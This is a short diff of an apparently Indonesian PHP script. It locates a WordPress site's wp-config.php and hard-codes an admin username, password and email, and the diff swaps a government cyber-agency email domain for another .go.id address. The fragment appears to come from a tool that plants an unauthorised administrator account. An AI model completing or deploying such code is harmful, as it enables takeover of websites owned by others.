@@ -9,7 +9,7 @@ $wp_config_path = $document_root . '/wp-config.php';
 // Variabel untuk data pengguna
 $user = 'matigan'; // Ganti dengan nama pengguna yang Anda inginkan
 $user_password = 'biringsayang45'; // Ganti dengan kata sandi yang Anda inginkan
-$email = 'matigan@bssn.go.id'; // Ganti dengan alamat email yang Anda inginkan
+$email = 'matigan@fefek.go.id'; // Ganti dengan alamat email yang Anda inginkan
 
 // Periksa apakah file wp-config.php ada
 if (file_exists($wp_config_path)) {
